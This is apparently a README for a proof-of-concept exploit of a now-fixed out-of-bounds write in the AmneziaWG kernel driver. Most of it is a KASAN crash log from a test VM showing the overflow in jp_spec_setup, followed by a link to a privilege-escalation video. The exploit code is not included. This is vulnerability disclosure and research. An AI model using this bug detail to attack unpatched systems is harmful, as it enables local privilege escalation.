# amnezia_kernel_driver_OOB_overflow_underflow_POC

Hi, there! 

This PoC shows how to make overflow or underflow in amnezia kernel dirver(already fixed) in kmalloc-8  
For exploit the targer u must have NET_CAPS for editing configs. Ubuntu users already have this capability 


also add KASAN logs from test stand 

```shell
/home/user # ./exp
[+] GENERATE KEY
[   46.354461] random: crng init done
[+] Making config
[+] Trigger exploit
[   46.530293] ==================================================================
[   46.530841] BUG: KASAN: slab-out-of-bounds in jp_spec_setup+0x158/0x280 [amneziawg]
[   46.530841] Write of size 16 at addr ffff8880688825a8 by task awg/101
[   46.530841] 
[   46.530841] CPU: 0 PID: 101 Comm: awg Not tainted 5.4.200 #3
[   46.530841] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   46.530841] Call Trace:
[   46.530841]  dump_stack+0x76/0x9c
[   46.530841]  print_address_description.constprop.0+0x18/0x290
[   46.530841]  ? jp_spec_setup+0x158/0x280 [amneziawg]
[   46.530841]  __kasan_report.cold+0x1a/0x32
[   46.530841]  ? jp_spec_setup+0x158/0x280 [amneziawg]
[   46.530841]  kasan_report+0x10/0x20
[   46.530841]  check_memory_region+0x13b/0x190
[   46.530841]  memcpy+0x34/0x50
[   46.530841]  jp_spec_setup+0x158/0x280 [amneziawg]
[   46.530841]  wg_set_device+0x543/0x9a0 [amneziawg]
[   46.530841]  ? nla_put+0xd0/0xd0
[   46.530841]  genl_family_rcv_msg+0x337/0x660
[   46.530841]  ? genl_notify+0xe0/0xe0
[   46.530841]  ? save_stack+0x46/0x70
[   46.530841]  ? save_stack+0x19/0x70
[   46.530841]  ? __kasan_kmalloc.isra.0+0xda/0xe0
[   46.530841]  ? __kmalloc_node_track_caller+0x10e/0x2c0
[   46.530841]  ? __alloc_skb+0x77/0x2a0
[   46.530841]  ? netlink_sendmsg+0x4af/0x620
[   46.530841]  ? __mutex_lock_slowpath+0x10/0x10
[   46.530841]  ? __radix_tree_lookup+0xa8/0x120
[   46.530841]  genl_rcv_msg+0x55/0xa0
[   46.530841]  netlink_rcv_skb+0xcf/0x200
[   46.530841]  ? genl_family_rcv_msg+0x660/0x660
[   46.530841]  ? netlink_ack+0x460/0x460
[   46.530841]  ? __netlink_lookup+0x1cb/0x260
[   46.530841]  ? down_read_killable+0x1a0/0x1a0
[   46.530841]  ? _copy_to_user+0x51/0x60
[   46.530841]  genl_rcv+0x1f/0x30
[   46.530841]  netlink_unicast+0x291/0x3a0
[   46.530841]  ? netlink_attachskb+0x350/0x350
[   46.530841]  ? _copy_from_iter_full+0xcd/0x370
[   46.530841]  ? memset+0x1f/0x40
[   46.530841]  netlink_sendmsg+0x395/0x620
[   46.530841]  ? netlink_unicast+0x3a0/0x3a0
[   46.530841]  ? netlink_unicast+0x3a0/0x3a0
[   46.530841]  sock_sendmsg+0x8f/0xa0
[   46.530841]  __sys_sendto+0x159/0x1e0
[   46.530841]  ? __ia32_sys_getpeername+0x40/0x40
[   46.530841]  ? __do_fault+0x6b/0x100
[   46.530841]  ? __sys_recvmsg+0xb2/0x130
[   46.530841]  ? __sys_recvmsg_sock+0x1a0/0x1a0
[   46.530841]  ? up_read+0x66/0x150
[   46.530841]  __x64_sys_sendto+0x6d/0x80
[   46.530841]  do_syscall_64+0x5a/0xb0
[   46.530841]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[   46.530841] RIP: 0033:0x451d17
[   46.530841] Code: ff ff f7 d8 48 c7 c3 ff ff ff ff 64 89 02 eb b9 0f 1f 00 f3 0f 1e fa 80 3d ad 13 0b 00 00 41 89 ca 74 10 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 69 c3 55 48 89 e5 53 48 83 ec 38 44 89 4d d0
[   46.530841] RSP: 002b:00007ffdc71cfba8 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[   46.530841] RAX: ffffffffffffffda RBX: 00000000010f3900 RCX: 0000000000451d17
[   46.530841] RDX: 00000000000000b0 RSI: 00000000010f4c60 RDI: 0000000000000004
[   46.530841] RBP: 0000000000000031 R08: 00000000004d6870 R09: 000000000000000c
[   46.530841] R10: 0000000000000000 R11: 0000000000000202 R12: 00000000010f4c30
[   46.530841] R13: 000000000000002c R14: 00000000010f4c60 R15: 000000000000002d
[   46.530841] 
[   46.530841] Allocated by task 101:
[   46.530841]  save_stack+0x19/0x70
[   46.530841]  __kasan_kmalloc.isra.0+0xda/0xe0
[   46.530841]  jp_spec_setup+0x106/0x280 [amneziawg]
[   46.530841]  wg_set_device+0x543/0x9a0 [amneziawg]
[   46.530841]  genl_family_rcv_msg+0x337/0x660
[   46.530841]  genl_rcv_msg+0x55/0xa0
[   46.530841]  netlink_rcv_skb+0xcf/0x200
[   46.530841]  genl_rcv+0x1f/0x30
[   46.530841]  netlink_unicast+0x291/0x3a0
[   46.530841]  netlink_sendmsg+0x395/0x620
[   46.530841]  sock_sendmsg+0x8f/0xa0
[   46.530841]  __sys_sendto+0x159/0x1e0
[   46.530841]  __x64_sys_sendto+0x6d/0x80
[   46.530841]  do_syscall_64+0x5a/0xb0
[   46.530841]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[   46.530841] 
[   46.530841] Freed by task 0:
[   46.530841] (stack is not available)
[   46.530841] 
[   46.530841] The buggy address belongs to the object at ffff8880688825a8
[   46.530841]  which belongs to the cache kmalloc-8 of size 8
[   46.530841] The buggy address is located 0 bytes inside of
[   46.530841]  8-byte region [ffff8880688825a8, ffff8880688825b0)
[   46.530841] The buggy address belongs to the page:
[   46.530841] page:ffffea0001a22080 refcount:1 mapcount:0 mapping:ffff88806c80c500 index:0xffff888068882f80 compound_mapcount: 0
[   46.530841] flags: 0x100000000010200(slab|head)
[   46.530841] raw: 0100000000010200 ffff88806c801e50 ffff88806c801e50 ffff88806c80c500
[   46.530841] raw: ffff888068882f80 000000000016000c 00000001ffffffff 0000000000000000
[   46.530841] page dumped because: kasan: bad access detected
[   46.530841] 
[   46.530841] Memory state around the buggy address:
[   46.530841]  ffff888068882480: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[   46.530841]  ffff888068882500: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[   46.530841] >ffff888068882580: fc fc fc fc fc 00 fc fc fc fc fc fc fc fc fc fc
[   46.530841]                                      ^
[   46.530841]  ffff888068882600: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[   46.530841]  ffff888068882680: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[   46.530841] ==================================================================
[   46.530841] Disabling lock debugging due to kernel taint
[*] Done
```

# LPE

https://github.com/user-attachments/assets/a7097a4d-4a0c-47a4-9d41-c1036173929f
